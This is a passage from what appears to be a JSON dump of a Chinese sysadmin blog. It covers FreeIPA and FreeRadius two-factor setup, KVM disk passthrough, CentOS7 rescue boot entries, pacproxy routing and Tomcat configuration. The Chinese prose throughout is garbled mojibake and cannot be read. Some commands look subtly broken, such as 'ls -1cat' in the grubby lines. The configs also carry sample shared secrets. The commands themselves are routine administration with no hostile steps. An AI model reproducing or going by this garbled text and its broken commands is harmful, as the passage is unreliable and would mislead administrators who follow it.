FreeIPAï¼Œé…ç½®æ–‡ä»¶åœ¨ /etc/ipa/default.conf\néªŒè¯ä¸€ä¸‹ï¼š\n1# è¾“å…¥ipaå¯†ç  2kinit admin 3klist 4 5ipactl status 6# sn è¾“å…¥ 01 7ipa cert-show ç™»å½•ï¼š http://freeipa.rendoumi.com ï¼Œï¼ˆæ³¨æ„ä½ è®¿é—®çš„æœºå™¨å¿…é¡»èƒ½è§£æåˆ°è¿™ä¸ªåŸŸåï¼‰ç”¨æˆ·å admin ï¼Œå¯†ç æ˜¯ä¸Šé¢å¡«å…¥çš„ ipa å¯†ç ï¼Œå»ºç«‹ä¸€ä¸ªæ–°ç”¨æˆ·\nç„¶åç»™è¿™ä¸ªç”¨æˆ·æ·»åŠ  OTP Tokenï¼š\nç¼ºçœä»€ä¹ˆéƒ½ä¸ç”¨å¡«ï¼Œç›´æ¥é€‰ Addï¼š\nä¼šè¹¦å‡ºæ¥ä¸€ä¸ªäºŒç»´ç ï¼Œå»ºè®®æ˜¯ç”¨ FreeOTP æ‰«æï¼š\næˆ‘ä»¬åœ¨æ‰‹æœºä¸Šè£…ä¸Š FreeOTP è½¯ä»¶ï¼Œæ‰«ææ·»åŠ ï¼š\nè¿™æ ·å°±okäº†ã€‚ä¸‹æ¬¡ç™»å½•çš„æ—¶å€™å¯†ç å°±æ˜¯é¢„è®¾å¯†ç +FreeOTPå¯†ç åˆåœ¨ä¸€èµ·ã€‚ä¸­é—´æ²¡æœ‰åŠ å·å“¦\næ¯”å¦‚é¢„è®¾å¯†ç æ˜¯ Fuckï¼Œotpå¯†ç æ˜¯762405ï¼Œåˆåœ¨ä¸€èµ·å°±æ˜¯ Fuck762405ï¼Œä¸€èµ·è¾“å…¥å³å¯ã€‚\né‚£ FreeIPA çš„éƒ¨åˆ†å°±å®Œæˆäº†ã€‚\näºŒã€æ­å»ºFreeRadius ä¸Šé¢çš„éƒ¨åˆ†å…¶å®æ˜¯ FreeIPA å……å½“äº†ç”¨æˆ·æ•°æ®åº“ï¼Œç”¨ LDAP å­˜æ”¾æ•°æ®ï¼Œè€Œ Radius éœ€è¦ä» IPA æ‹¿åˆ°ç”¨æˆ·ä¿¡æ¯ã€‚\nå®‰è£…ï¼š\n1yum -y install freeradius freeradius-utils freeradius-ldap freeradius-krb5 Radius çš„é…ç½®éƒ½åœ¨ /etc/raddb ç›®å½•ä¸‹ï¼š\nç¼–è¾‘ /etc/raddb/client.conf ï¼Œå¢åŠ ä¸€ä¸ªç½‘æ®µçš„è®¤è¯ï¼Œå…è®¸ 172.0.0.0/8 è®¿é—®\n1client localnet { 2 ipaddr = 172.0.0.0/8 3 proto = * 4 secret = Fuck2021 5 nas_type = other 6 limit { 7 max_connections = 16 8 lifetime = 0 9 idle_timeout = 30 10 } 11} åŒæ—¶ä¿®æ”¹ä¸‹é¢çš„ clinet localhost éƒ¨åˆ†ï¼Œä¿®æ”¹ secretï¼Œä¹‹åæˆ‘ä»¬è¦ä»æœ¬åœ°ç™»å½•åšæµ‹è¯•\n1client localhost { 2 secret = ChinaBank2021 3 å†ä¿®æ”¹ /etc/raddb/sites-enabled/default and /etc/raddb/sites-enabled/inner-tunnel ï¼Œæ”¯æŒ LDAPï¼Œæœ‰äºŒå¤„åœ°æ–¹\næŠŠ\n1 # 2 # The ldap module reads passwords from the LDAP database. 3 -ldap æ¢æˆï¼š\n1 # 2 # The ldap module reads passwords from the LDAP database. 3 ldap 4 if ((ok || updated) \u0026amp;\u0026amp; User-Password) { 5 update { 6 control:Auth-Type := ldap 7 } 8 } æŠŠ\n1# Auth-Type LDAP { 2# ldap 3# } æ¢æˆï¼š\n1 Auth-Type LDAP { 2 ldap 3 } ç„¶å ldap æ¨¡å—é…ç½®ä¸€ä¸‹\n1ln -s /etc/raddb/mods-available/ldap /etc/raddb/mods-enabled/ æˆ‘ä»¬å…ˆç”¨ ldapsearch æœç´¢ä¸€ä¸‹ï¼Œçœ‹çœ‹å…·ä½“çš„ dn ä¿¡æ¯ï¼Œè¿™é‡Œè¾“å…¥ä¹‹å‰è®¾ç½®çš„ ldap å¯†ç \n1ldapsearch -x -v -W -D \u0026#39;cn=Directory Manager\u0026#39; uid=test|grep test 2ldap_initialize( \u0026lt;DEFAULT\u0026gt; ) 3Enter LDAP Password: 4filter: uid=test 5requesting: All userApplication attributes 6memberOf: cn=test,cn=groups,cn=accounts,dc=rendoumi,dc=local å¾—åˆ° cn=accounts,dc=rendoumi,dc=local\nå†å»ä¿®æ”¹ /etc/raddb/mods-enabled/ldap æ–‡ä»¶ï¼Œä¿®æ”¹ server å’Œ base_dn ä¸ä¹‹å¯¹åº”ï¼š\n1 server = \u0026#39;freeipa.rendoumi.local\u0026#39; 2 base_dn = \u0026#39;cn=accounts,dc=rendoumi,dc=local\u0026#39; æ³¨æ„ï¼Œä¸Šé¢æˆ‘ä»¬æ²¡è£… bindï¼Œæ‰€ä»¥å¿…é¡»åœ¨ /etc/hosts å­˜åœ¨è®°å½•ï¼Œå¦åˆ™æœ¬åœ°å°±è®¿é—®ä¸åˆ°äº†\nå¯åŠ¨ radiusd çš„è°ƒè¯•æ¨¡å¼ï¼š\n1radiusd â€“X 2... 3Listening on auth address * port 1812 as server default 4Listening on acct address * port 1813 as server default 5Listening on auth address :: port 1812 as server default 6Listening on acct address :: port 1813 as server default 7Listening on auth address 127.0.0.1 port 18120 as server inner-tunnel 8Opening new proxy socket \u0026#39;proxy address * port 0\u0026#39; 9Listening on proxy address * port 36752 10Ready to process requests å†å¼€ä¸€ä¸ªç»ˆç«¯æµ‹è¯•ä¸€ä¸‹ï¼Œæ³¨æ„ï¼Œæˆ‘ä»¬æ˜¯ä»æœ¬åœ°(127.0.0.1)å‘èµ·æµ‹è¯•çš„ï¼Œæ‰€ä»¥å¯¹åº”è¦ç”¨åˆ°ä¸Šé¢è®¾ç½®çš„ secretï¼Œç”¨ admin ç™»å½•ï¼Œå°±é¿å…è¦ç”¨åˆ° freeotp çš„å£ä»¤ï¼Œè¿™é‡Œ xxxxxxxx æ˜¯ admin çš„å¯†ç ï¼š\n1radtest admin xxxxxxxx freeipa.rendoumi.local 1812 ChinaBank2021 2Sent Access-Request Id 57 from 0.0.0.0:45247 to 172.18.31.41:1812 length 75 3 User-Name = \u0026#34;admin\u0026#34; 4 User-Password = \u0026#34;xxxxxxxx\u0026#34; 5 NAS-IP-Address = 172.18.31.41 6 NAS-Port = 1812 7 Message-Authenticator = 0x00 8 Cleartext-Password = \u0026#34;xxxxxxxx\u0026#34; 9Received Access-Accept Id 57 from 172.18.31.41:1812 to 0.0.0.0:0 length 20 çœ‹åˆ°ä¸Šé¢ Access-Accept å°±okäº†ï¼Œctrl-c ç»ˆæ­¢ radiusd çš„è¿è¡Œï¼Œå¼€å¯ radiusd æœåŠ¡ã€‚\n1systemctl enable --now radiusd ç„¶ååœ¨åä¸ºé˜²ç«å¢™è®¾ç½®è¿™ä¸ª radiusd æœåŠ¡å™¨å°±å¯ä»¥äº†ã€‚\nå‚è€ƒèµ„æ–™ï¼š\nhttps://www.freeipa.org/page/Using_FreeIPA_and_FreeRadius_as_a_RADIUS_based_software_token_OTP_system_with_CentOS/RedHat_7 ","date":"2021-11-23","img":"","permalink":"https://rendoumi.com/posts/20211123-freeipa_freeradius/","series":null,"tags":null,"title":"ä½¿ç”¨FreeIPAå’ŒFreeRadiusæ­å»ºåŒå› å­è®¤è¯æœåŠ¡å™¨"},{"categories":null,"content":"è¿™ä¸ªæ¯”è¾ƒæœ‰æ„æ€ï¼ŒåŒäº‹è¦å­˜æ”¾ 2TB çš„æ•°æ®ï¼Œä½†æ˜¯ç³»ç»Ÿæ˜¯ 1.7TB çš„ 4 å— 600G ç›˜ç»„æˆçš„ Raid10ã€‚\nå¾ˆæ˜æ˜¾ç›˜ç©ºé—´ä¸å¤Ÿäº†ï¼Œå»åº“æˆ¿æ‰¾ä¸¤å— 10TB çš„å¤§ç›˜ç»„æˆ Raid1 ç»™ä»–ç”¨å¥½äº†ã€‚\né—®é¢˜æ¥äº†ï¼Œç³»ç»Ÿæ˜¯ KVM è™šæœºï¼Œæ€æ ·æŠŠè¿™ä¸ª 10TB çš„å¤§ç›˜ç»™é€è¿›è™šæœºå‘¢ï¼Ÿ\nè¿™é‡Œé¢è¿˜çœŸæœ‰è¦æ³¨æ„çš„é—®é¢˜ï¼š\nImportant\nGuest virtual machines should not be given write access to whole disks or block devices (for example, /dev/sdb). Guest virtual machines with access to whole block devices may be able to modify volume labels, which can be used to compromise the host physical machine system. Use partitions (for example, /dev/sdb1) or LVM volumes to prevent this issue.\næ³¨æ„ä¸Šé¢çš„è¯´æ˜ï¼Œæ˜¯ä¸å»ºè®®å°†æ•´ä¸ªç¡¬ç›˜é€è¿›è™šæœºé‡Œé¢å»çš„ï¼Œå»ºè®®æ˜¯é€åˆ†åŒºè¿›å»ï¼Œé¿å…ä¼šå†™åæ•´ä¸ªç›˜ã€‚\næ‰€ä»¥å…ˆæŠŠç›˜çš„åˆ†åŒºåšå¥½ï¼Œæ ¼å¼åŒ–å¹¶æŒ‚è½½ï¼Œä»¥ /dev/sdb ä¸ºä¾‹\n1parted -s /dev/sdb mklabel gpt mkpart primary 0% 100% 2mkfs.xfs /dev/sdb1 3mount -t xfs /dev/sdb1 /mnt/sdb1 ç„¶ååˆ°å®ä½“æœºçš„ç£ç›˜ç›®å½•\n1# cd /dev/disk/ 2# ls 3by-id by-path by-uuid 4 5# cd by-id 6# ll 7total 0 8lrwxrwxrwx 1 root root 9 3æœˆ 26 2018 scsi-36b083fe0e4f71a001c36c36716543d4d -\u0026gt; ../../sda 9lrwxrwxrwx 1 root root 10 3æœˆ 26 2018 scsi-36b083fe0e4f71a001c36c36716543d4d-part1 -\u0026gt; ../../sda1 10lrwxrwxrwx 1 root root 10 3æœˆ 26 2018 scsi-36b083fe0e4f71a001c36c36716543d4d-part2 -\u0026gt; ../../sda2 11lrwxrwxrwx 1 root root 10 3æœˆ 26 2018 scsi-36b083fe0e4f71a001c36c36716543d4d-part3 -\u0026gt; ../../sda3 12lrwxrwxrwx 1 root root 9 11æœˆ 18 16:02 scsi-36b083fe0e4f71a002928bf63ef284827 -\u0026gt; ../../sdb 13lrwxrwxrwx 1 root root 10 11æœˆ 18 16:24 scsi-36b083fe0e4f71a002928bf63ef284827-part1 -\u0026gt; ../../sdb1 14lrwxrwxrwx 1 root root 9 3æœˆ 26 2018 wwn-0x6b083fe0e4f71a001c36c36716543d4d -\u0026gt; ../../sda 15lrwxrwxrwx 1 root root 10 3æœˆ 26 2018 wwn-0x6b083fe0e4f71a001c36c36716543d4d-part1 -\u0026gt; ../../sda1 16lrwxrwxrwx 1 root root 10 3æœˆ 26 2018 wwn-0x6b083fe0e4f71a001c36c36716543d4d-part2 -\u0026gt; ../../sda2 17lrwxrwxrwx 1 root root 10 3æœˆ 26 2018 wwn-0x6b083fe0e4f71a001c36c36716543d4d-part3 -\u0026gt; ../../sda3 18lrwxrwxrwx 1 root root 9 11æœˆ 18 16:02 wwn-0x6b083fe0e4f71a002928bf63ef284827 -\u0026gt; ../../sdb 19lrwxrwxrwx 1 root root 10 11æœˆ 18 16:24 wwn-0x6b083fe0e4f71a002928bf63ef284827-part1 -\u0026gt; ../../sdb1 çœ‹ä¸­é—´ä¸€è¡Œï¼Œscsi-36b083fe0e4f71a002928bf63ef284827-part1 æŒ‡å‘ /dev/sdb1ï¼Œè®°å½•ä¸‹æ¥\nç„¶å virsh-edit ç¼–è¾‘ KVM è™šæœºæ–‡ä»¶ï¼Œå¢åŠ ç¡¬ç›˜éƒ¨åˆ†ï¼š\n1 \u0026lt;disk type=\u0026#39;block\u0026#39; device=\u0026#39;disk\u0026#39;\u0026gt; 2 \u0026lt;driver name=\u0026#39;qemu\u0026#39; type=\u0026#39;raw\u0026#39;/\u0026gt; 3 \u0026lt;source dev=\u0026#39;/dev/disk/by-id/scsi-36b083fe0e4f71a002928bf63ef284827-part1\u0026#39;/\u0026gt; 4 \u0026lt;target dev=\u0026#39;vda\u0026#39; bus=\u0026#39;virtio\u0026#39;/\u0026gt; 5 \u0026lt;/disk\u0026gt; æ³¨ï¼šä¸Šé¢æˆ‘ä»¬æ˜¯ä½¿ç”¨äº† by-idï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨ by-path å’Œ by-uuid æ¥æŒ‡å®šæºç›˜\né‡å¯è™šæœºå¹¶è¿›å…¥æŸ¥çœ‹ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°è¿™å—ç›˜ç›˜ç¬¦æ˜¯ /dev/vda\n1fdisk -l 2 3Disk /dev/vda: 11755.9 GB, 11755860262912 bytes, 22960664576 sectors 4Units = sectors of 1 * 512 = 512 bytes 5Sector size (logical/physical): 512 bytes / 512 bytes 6I/O size (minimum/optimal): 512 bytes / 512 bytes æ¥ä¸‹æ¥å°±æ¯”è¾ƒæ€ªå¼‚äº†ï¼Œè¿™ä¸ªç›˜åˆ†æ˜æ²¡æœ‰åˆ†åŒºï¼Œæˆ‘ä»¬å´å¯ä»¥ç›´æ¥ mount\n1mount -t xfs /dev/vda /material ç„¶å df -h å†çœ‹\nèƒ½è®¤å‡ºæ¥ï¼Œæ­£å¸¸ä½¿ç”¨å°±è¡Œäº†ã€‚\néå¸¸å¤æ€ªæ˜¯å§ã€‚\nå¤§å®¶è¿˜è¦æ³¨æ„å®ä½“æœºçš„æŒ‚è½½è·¯å¾„æ˜¯ /mnt/sdb1ï¼Œè™šæœºå†…çš„æŒ‚è½½è·¯å¾„æ˜¯ /materialï¼Œè¿™ä¸¤ä¸ªè·¯å¾„éƒ½æ˜¯æŒ‡å‘åŒä¸€å—ç›˜ï¼Œå¯ä»¥å…±é€šã€‚\n","date":"2021-11-19","img":"","permalink":"https://rendoumi.com/posts/20211119-kvm_disk_passthrough/","series":null,"tags":null,"title":"KVMä¸‹é™„åŠ ç¡¬ç›˜çš„passthroughç›´é€š"},{"categories":null,"content":"è¯´åˆ° CentOS7 çš„ç´§æ€¥æ¨¡å¼ä¸æ•‘æ´æ¨¡å¼ï¼Œç½‘ä¸Šå¯ä»¥æœåˆ°æ¼«å¤©é£çš„å¸–å­ï¼Œè¯´ä¸€ä¸‹åŒºåˆ«\nRESCUE æ•‘æ´æ¨¡å¼ï¼š æ•‘æ´æ¨¡å¼å¯åŠ¨çš„ç³»ç»Ÿæ²¡æœ‰æŒ‚è½½ç¡¬ç›˜ï¼Œå¯ä»¥å°†ç¡¬ç›˜ mount å‡ºç„¶åæ‹·å‡ºæ•°æ®ã€‚\nEMERGENCY ç´§æ€¥æ¨¡å¼ï¼š ç´§æ€¥æ¨¡å¼å¯åŠ¨çš„ç³»ç»Ÿæ˜¯ä¸€ä¸ªæœ€å°çš„ç¯å¢ƒã€‚æ ¹ç›®å½•æ¡£æ¡ˆç³»ç»Ÿå°†ä¼šè¢«æŒ‚è½½ä¸ºä»…èƒ½è¯»å–ï¼Œè€Œä¸”å°†ä¸ä¼šåšä»»ä½•çš„è®¾å®šã€‚\nå½“ç„¶è¿›å…¥çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œè¿›å…¥ç³»ç»Ÿçš„æ—¶å€™æŒ‰ e ä¿®æ”¹ grub èœå•å‚æ•°ï¼Œå°±å¯ä»¥è¿›å…¥ä¸åŒçš„æ¨¡å¼\næœ¬æ–‡è®¨è®ºçš„é‡ç‚¹ä¸æ˜¯æ€ä¹ˆè¿›å»ï¼Œè€Œæ˜¯é‚£ä¸¤å¥å‘½ä»¤ï¼Œåœ¨ç´§æ€¥çŠ¶æ€ä¸‹åæ­£æˆ‘æ˜¯è®°ä¸ä½çš„\n1systemd.unit=rescue.target 2systemd.unit=emergency.target éƒ½æ²¡æœ‰ä¹‹å‰çš„ single ç®€å•ï¼Œä¹Ÿå®Œå…¨è®°ä¸ä½ï¼Œæ—¢ç„¶è®°ä¸ä½ï¼Œé‚£å°±å¹²è„†åšåˆ°èœå•é‡Œå¥½äº†ï¼Œè¿™æ‰æ˜¯æœ¬æ–‡çš„é‡ç‚¹ã€‚\nç°åœ¨éƒ½æ˜¯ä½¿ç”¨ grub2 äº†ï¼Œè€Œä¸æ˜¯ grubï¼Œè¿™å¾ˆé‡è¦ã€‚grub2çš„é…ç½®æ–‡ä»¶æ˜¯ /boot/grub2/grub.cfgã€‚\nä¿®æ”¹ grub2 æœ‰ä¸¤ä¸ªå·¥å…·ï¼Œgrub2-mkconfig å’Œ grubbyï¼Œä¸è¦åŒæ—¶ä½¿ç”¨è¿™ä¸¤ä¸ªå·¥å…·ä¿®æ”¹ï¼Œä¼šè¦†ç›–çš„\ngrub2-mkconfig ä¼šå»æœç´¢ /boot ç›®å½•ä¸‹çš„å†…æ ¸æ–‡ä»¶ï¼Œæœ‰å¤šå°‘ä¸ªå†…æ ¸å°±ä¼šç”Ÿæˆå¤šå°‘ä¸ªå¯åŠ¨é¡¹ã€‚é‚£ä¹ˆå¦‚æœæ˜¯åŒä¸€ä¸ªå†…æ ¸ï¼Œæƒ³ä¿®æ”¹ä¸åŒçš„å¯åŠ¨å‚æ•°ï¼Œåšå¤šä¸ªå¯åŠ¨é¡¹å°±å®Œè›‹ï¼Œä»–ä¸èƒ½è‡ªåŠ¨ç”Ÿæˆå•å†…æ ¸çš„å¤šä¸ªå¯åŠ¨é¡¹ grubby å¾ˆçµæ´»ï¼Œå¯ä»¥æ ¹æ®å½“å‰ grub2 çš„é…ç½®ï¼Œç”Ÿæˆä¸€ä¸ªå†…æ ¸ï¼Œå¤šä¸ªä¸åŒå¯åŠ¨å‚æ•°çš„å¤šä¸ªå¯åŠ¨é¡¹ã€‚ é‚£ä¹ˆæˆ‘ä»¬è¦åŠ è¿›å»ä¸¤ä¸ªåªæ˜¯å¯åŠ¨å‚æ•°ä¸åŒï¼Œå†…æ ¸å…¶å®ä¸€æ ·çš„å¯åŠ¨é¡¹ï¼Œç”¨ grubby å°±å¥½äº†\n1grubby --add-kernel=\\$(ls -1cat /boot/vmlinuz*|grep rescue) --title=\u0026#34;RESCUE BOOT\u0026#34; --initrd=\\$(ls -1cat /boot/initramfs*|grep rescue) --args=\u0026#34;systemd.unit=rescue.target\u0026#34; --copy-default 2 3grubby --add-kernel=\\$(ls -1cat /boot/vmlinuz*|grep rescue) --title=\u0026#34;EMERGENCY BOOT\u0026#34; --initrd=\\$(ls -1cat /boot/initramfs*|grep rescue) --args=\u0026#34;systemd.unit=emergency.target\u0026#34; --copy-default åˆ‡å¿Œæˆ‘ä»¬ä¹‹åä¸èƒ½è¿è¡Œ\n1grub2-mkconfig -o /boot/grub2/grub.cfg å¦åˆ™ä¸Šé¢çš„ä¸¤ä¸ªå¯åŠ¨é¡¹èœå•ä¼šæ¶ˆå¤±ï¼Œå› ä¸º grub2-mkconfig é…ç½®çš„è¯ä¸€ä¸ªå†…æ ¸åªèƒ½æœ‰ä¸€ä¸ªå¯åŠ¨é¡¹\ngrub2-mkconfig ä¹Ÿæœ‰è‡ªå·±çš„å¼ºé¡¹ï¼Œå¦‚æœè¦ä¿®æ”¹ç¼ºçœçš„èœå•è¶…æ—¶æ—¶é—´ï¼Œgrubby å°±åšä¸åˆ°äº†\n1sed -i \u0026#39;/^GRUB_TIMEOUT=/s/^.*$/GRUB_TIMEOUT=10/\u0026#39; /etc/default/grub 2grub2-mkconfig -o /boot/grub2/grub.cfg ","date":"2021-11-19","img":"","permalink":"https://rendoumi.com/posts/20211119-linux_rescue/","series":null,"tags":null,"title":"CentOS7çš„æ•‘æ´æ¨¡å¼å’Œç´§æ€¥æ¨¡å¼"},{"categories":null,"content":"è¯´å®åœ¨è¯ï¼Œè¿™ä¸ªåœºæ™¯éå¸¸æ€ªå¼‚ï¼Œå®¢æˆ·åœ¨ linux ä¸‹è¦åŠ¨æ€æ ¹æ® url é€‰æ‹©ä»£ç†ï¼š\nçœ‹å›¾ï¼Œä¸­é—´çš„æ˜¯å‰ç«¯ä»£ç†ï¼Œåœ°å€æ˜¯ 192.168.1.1:8080ï¼Œç„¶åå®¢æˆ·è®¾ç½®ä½¿ç”¨è¿™ä¸ªä»£ç†\n1export http_proxy=http://192.168.1.1:8080 2export https_proxy=http://192.168.1.1:8080 ç„¶åå¯¹åº”åç«¯æœ‰ä¸‰ä¸ªä»£ç†ï¼Œä¸¤ä¸ª http ä»£ç†ï¼Œä¸€ä¸ª socks ä»£ç†\n1http 192.168.2.1:3128 2socks 192.168.2.2:1080 3http 192.168.2.3:3128 æˆ‘ä»¬è¦æ ¹æ®å®¢æˆ·çš„è¯·æ±‚ URL æ¥å†³å®šå…·ä½“è¦ä½¿ç”¨åç«¯çš„å“ªä¸ªä»£ç†\nè¿™ä¸ªå¦‚æœåœ¨æµè§ˆå™¨ä¸Šè®¾ç½®éå¸¸å®¹æ˜“ï¼Œè®¾ç½® PAC å³å¯ã€‚ä½†æ˜¯ååå®¢æˆ·ç«¯ä¸æ˜¯æµè§ˆå™¨ï¼Œè€Œæ˜¯ä¸€ä¸ªç¨‹åºï¼Œé‚£ä¹ˆéº»çƒ¦å°±æ¥äº†ã€‚æ€ä¹ˆè®¾ç½®å‘¢ï¼Ÿ\næ­¥éª¤å¾ˆç®€å•ï¼š\nä¸€ã€å®‰è£… pacproxy ç½‘å€ï¼šhttps://github.com/williambailey/pacproxy\n1wget https://github.com/williambailey/pacproxy/releases/download/v.2.0.4/pacproxy_2.0.4_linux_amd64.tar.gz 2tar zxvf pacproxy_2.0.4_linux_amd64.tar.gz æ‹·å‡ºæ¥ pacproxy å¤‡ç”¨\näºŒã€ç”Ÿæˆé…ç½®æ–‡ä»¶ æœ€ä¸»è¦çš„å°±æ˜¯ PAC æ–‡ä»¶çš„ç”Ÿæˆ\næˆ‘ä»¬ç»™ä¸ªä¾‹å­ï¼š\n1cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; pac 2function FindProxyForURL(url, host) 3{ 4 if (host == \u0026#34;www.baidu.com\u0026#34;) { 5 return \u0026#34;PROXY 192.168.2.1:3128\u0026#34;; 6 } 7 else if (host == \u0026#34;www.sina.com.cn\u0026#34;) { 8 return \u0026#34;SOCKS 192.168.2.2:1080\u0026#34;; 9 } 10 else if (host == \u0026#34;www.sohu.com\u0026#34;) { 11 return \u0026#34;SOCKS 192.168.2.3:1080\u0026#34;; 12 } 13 else { 14 return \u0026#34;DIRECT\u0026#34;; 15 } 16} 17EOF å…¶å® PAC æ–‡ä»¶çš„å†…å®¹å°±æ˜¯ä¸€æ®µ javascriptï¼Œç”¨æ¥è¿”å›ä»£ç†çš„åœ°å€\nè¿è¡Œå¹¶æµ‹è¯•ï¼š\n1pacproxy -c pac -l 0.0.0.0:8080 -v 2 3 4export http_proxy=http://192.168.1.1:8080 5export https_proxy=http://192.168.1.1:8080 6curl -I www.baidu.com è¿™æ ·å°±åœ¨ Linux æ­å»ºäº†ä¸€ä¸ªåŠ¨æ€çš„ PAC ä»£ç†\nPACæ–‡ä»¶çš„å‚è€ƒèµ„æ–™ï¼š\nhttps://web.archive.org/web/20070602031929/http://wp.netscape.com/eng/mozilla/2.0/relnotes/demo/proxy-live.html https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Proxy_servers_and_tunneling/Proxy_Auto-Configuration_PAC_file https://www.websense.com/content/support/library/web/v76/pac_file_best_practices/PAC_file_sample.aspx ","date":"2021-11-16","img":"","permalink":"https://rendoumi.com/posts/20211116-pacproxy/","series":null,"tags":null,"title":"Linuxä¸‹web Pacproxyçš„ç”¨æ³•"},{"categories":null,"content":"Tomcat æ˜¯ä¸€ä¸ª HTTP serverã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ª serverlet å®¹å™¨ï¼Œå¯ä»¥æ‰§è¡Œ java çš„ Servletï¼Œä¹Ÿå¯ä»¥æŠŠ JavaServer Pagesï¼ˆJSPï¼‰å’Œ JavaServerFacesï¼ˆJSFï¼‰ç¼–è¯‘æˆ Java Servletã€‚å®ƒçš„æ¨¡å‹å›¾å¦‚ä¸‹ï¼š\nç»™ä¸ªç”Ÿäº§ç¯å¢ƒ server.xml çš„ä¾‹å­ï¼š\n1\u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#39;utf-8\u0026#39;?\u0026gt; 2\u0026lt;Server port=\u0026#34;-1\u0026#34; shutdown=\u0026#34;SHUTDOWN\u0026#34;\u0026gt; 3 \u0026lt;Listener className=\u0026#34;org.apache.catalina.startup.VersionLoggerListener\u0026#34; /\u0026gt; 4 \u0026lt;Listener className=\u0026#34;org.apache.catalina.core.AprLifecycleListener\u0026#34; SSLEngine=\u0026#34;on\u0026#34; /\u0026gt; 5 \u0026lt;Listener className=\u0026#34;org.apache.catalina.core.JreMemoryLeakPreventionListener\u0026#34; /\u0026gt; 6 \u0026lt;Listener className=\u0026#34;org.apache.catalina.mbeans.GlobalResourcesLifecycleListener\u0026#34; /\u0026gt; 7 \u0026lt;Listener className=\u0026#34;org.apache.catalina.core.ThreadLocalLeakPreventionListener\u0026#34; /\u0026gt; 8 9 \u0026lt;GlobalNamingResources\u0026gt; 10 \u0026lt;Resource name=\u0026#34;UserDatabase\u0026#34; auth=\u0026#34;Container\u0026#34; 11 type=\u0026#34;org.apache.catalina.UserDatabase\u0026#34; 12 description=\u0026#34;User database that can be updated and saved\u0026#34; 13 factory=\u0026#34;org.apache.catalina.users.MemoryUserDatabaseFactory\u0026#34; 14 pathname=\u0026#34;conf/tomcat-users.xml\u0026#34; /\u0026gt; 15 \u0026lt;/GlobalNamingResources\u0026gt; 16 17 \u0026lt;Service name=\u0026#34;Catalina\u0026#34;\u0026gt; 18 \u0026lt;Connector port=\u0026#34;8080\u0026#34; 19 server=\u0026#34;www.rendoumi.com\u0026#34; 20 protocol=\u0026#34;org.apache.coyote.http11.Http11NioProtocol\u0026#34; 21 maxHttpHeaderSize=\u0026#34;8192\u0026#34; 22 acceptCount=\u0026#34;500\u0026#34; 23 maxThreads=\u0026#34;1000\u0026#34; 24 minSpareThreads=\u0026#34;200\u0026#34; 25 enableLookups=\u0026#34;false\u0026#34; 26 redirectPort=\u0026#34;8443\u0026#34; 27 connectionTimeout=\u0026#34;20000\u0026#34; 28 relaxedQueryChars=\u0026#34;[]|{}@!$*()+\u0026#39;.,;^\\`\u0026amp;quot;\u0026amp;lt;\u0026amp;gt;\u0026#34; 29 disableUploadTimeout=\u0026#34;true\u0026#34; 30 allowTrace=\u0026#34;false\u0026#34; 31 URIEncoding=\u0026#34;UTF-8\u0026#34; 32 useBodyEncodingForURI=\u0026#34;true\u0026#34; /\u0026gt; 33 34 \u0026lt;Engine name=\u0026#34;Catalina\u0026#34; defaultHost=\u0026#34;localhost\u0026#34;\u0026gt; 35 \u0026lt;Realm className=\u0026#34;org.apache.catalina.realm.LockOutRealm\u0026#34;\u0026gt; 36 \u0026lt;Realm className=\u0026#34;org.apache.catalina.realm.UserDatabaseRealm\u0026#34; 37 resourceName=\u0026#34;UserDatabase\u0026#34;/\u0026gt; 38 \u0026lt;/Realm\u0026gt; 39 \u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;webapps\u0026#34; unpackWARs=\u0026#34;false\u0026#34; autoDeploy=\u0026#34;false\u0026#34;\u0026gt; 40 \u0026lt;Valve className=\u0026#34;org.apache.catalina.valves.AccessLogValve\u0026#34; directory=\u0026#34;logs\u0026#34; prefix=\u0026#34;access_log.\u0026#34; suffix=\u0026#34;.txt\u0026#34; 41 fileDateFormat=\u0026#34;yyyy-MM-dd\u0026#34; 42 pattern=\u0026#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i \u0026#34; resolveHosts=\u0026#34;false\u0026#34;/\u0026gt; 43 \u0026lt;Context path=\u0026#34;\u0026#34; docBase=\u0026#34;/export/servers/tomcat/webapps/web\u0026#34; /\u0026gt; 44 \u0026lt;/Host\u0026gt; 45 46 \u0026lt;/Engine\u0026gt; 47 \u0026lt;/Service\u0026gt; 48\u0026lt;/Server\u0026gt; åˆ†è§£å¼€æ¥ä¸€éƒ¨åˆ†ä¸€éƒ¨åˆ†çš„çœ‹ï¼š\nServer Server ç¬¬2è¡Œï¼Œæ˜¯æœ€å¤§ä¸”å¿…é¡»å”¯ä¸€çš„ç»„ä»¶ã€‚è¡¨ç¤ºä¸€ä¸ª Tomcat çš„å®ä¾‹ï¼Œå®ƒå¯ä»¥åŒ…å«å¤šä¸ª Servicesï¼Œè€Œæ¯ä¸ª Service éƒ½å¯ä»¥æœ‰è‡ªå·±çš„ Engine å’Œ connectorsã€‚\n1\u0026lt;Server port=\u0026#34;8005\u0026#34; shutdown=\u0026#34;SHUTDOWN\u0026#34;\u0026gt; ...... \u0026lt;/Server\u0026gt; æ³¨æ„ä¸Šé¢ï¼Œæˆ‘ä»¬æŠŠç¼ºçœçš„ port=\u0026ldquo;8005\u0026rdquo; æ”¹æˆäº† â€œ-1â€ï¼Œè¿™æ ·é˜²æ­¢ä»8005é‡å¯ï¼Œé¿å…å®‰å…¨é—®é¢˜ã€‚\nListeners ä¸€ä¸ª Server å®¹å™¨æ‹¥æœ‰è‹¥å¹² Listeners (è¡Œ 3-7)ã€‚ä¸€ä¸ª Listener ç›‘å¬å¹¶å›åº”ç‰¹å®šçš„äº‹ä»¶.\nä¾‹å¦‚ GlobalResourcesLifecycleListener å°±è®¾ç½®äº† global resourcesï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨ JNDI æ¥å­˜å–åƒæ•°æ®åº“è¿™ç§èµ„æºã€‚\n1\u0026lt;Listener className=\u0026#34;org.apache.catalina.mbeans.GlobalResourcesLifecycleListener\u0026#34; 